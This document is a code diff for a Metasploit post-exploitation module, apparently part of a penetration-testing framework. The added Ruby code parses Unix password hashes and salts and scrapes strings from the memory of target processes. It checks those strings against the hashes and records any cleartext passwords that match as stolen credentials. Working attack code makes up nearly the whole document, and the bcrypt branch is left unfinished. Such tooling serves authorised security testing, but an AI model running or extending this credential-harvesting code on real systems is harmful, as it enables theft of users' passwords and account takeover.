@@ -78,6 +78,39 @@ class MetasploitModule < Msf::Post
     users
   end
 
+  def configure_passwords(user_data = [])
+    user_data.each do |info|
+      hash = info['hash']
+      case hash[0..2]
+      when '$1$'
+        info['type'] = 'md5'
+      when '$2a', '$2y'
+        info['type'] = 'blowfish'
+      when '$5$'
+        info['type'] = 'sha256'
+      when '$6$'
+        info['type'] = 'sha512'
+      end
+
+      salt = ''
+      if info['type'] == 'blowfish'
+        arr = hash.split('$')
+        next if arr.length < 4
+
+        cost = arr[2]
+        salt = arr[3][0..21]
+        info['cost'] = cost
+      else
+        salt = hash.split('$')[2]
+      end
+      next if salt.nil?
+
+      info['salt'] = salt
+    end
+
+    user_data
+  end
+
   def get_matches(target_info = {})
     if target_info.empty?
       vprint_status('Invalid target info supplied')
@@ -164,12 +197,38 @@ class MetasploitModule < Msf::Post
     lines
   end
 
-  def check_for_password(captured_strings, passwords); end
+  def check_for_valid_passwords(captured_strings, user_data, process_name)
+    captured_strings.each do |str|
+      user_data.each do |pass_info|
+        salt = pass_info['salt']
+        hash = pass_info['hash']
+        pass_type = pass_info['type']
+        u_name = pass_info['username']
+        case pass_type
+        when 'md5'
+          hashed = UnixCrypt::MD5.build(str, salt)
+        when 'blowfish'
+          # bcrypt?
+        when 'sha256'
+          hashed = UnixCrypt::SHA256.build(str, salt)
+        when 'sha512'
+          hashed = UnixCrypt::SHA512.build(str, salt)
+        end
+
+        next unless hashed == hash
+
+        print_good("Found valid password '#{str}' for user '#{u_name}'!")
+        pass_info['password'] = str
+        pass_info['process'] = process_name
+      end
+    end
+  end
 
   def run
     fail_with(Failure::BadConfig, 'Root privileges are required') unless is_root?
     user_data = get_user_names_and_hashes
     fail_with(Failure::UnexpectedReply, 'Failed to retrieve user information') if user_data.empty?
+    password_data = configure_passwords(user_data)
 
     target_proc_info = [
       {
@@ -204,12 +263,14 @@ class MetasploitModule < Msf::Post
       }
     ]
 
-    # matches = []
     captured_strings = []
     target_proc_info.each do |info|
       print_status("Checking matches for process #{info['name']}")
       match_set = get_matches(info)
-      next if match_set.empty?
+      if match_set.empty?
+        vprint_status("No matches found for process #{info['name']}")
+        next
+      end
 
       match_set.each { |match| match.store('pid', info['pid']) }
       search_regions = choose_mem_regions(match_set)
@@ -219,7 +280,17 @@ class MetasploitModule < Msf::Post
 
       captured_strings.flatten!
       captured_strings.uniq!
-      # matches << match_set
+      check_for_valid_passwords(captured_strings, password_data, info['name'])
+    end
+
+    results = password_data.select { |res| res.key?('password') && !res['password'].nil? }
+    print_good("Found #{results.length} valid credential(s)!")
+    results.each do |res|
+      store_valid_credential(
+        user: res['username'],
+        private: res['password'],
+        private_type: 'password'
+      )
     end
   end
 end
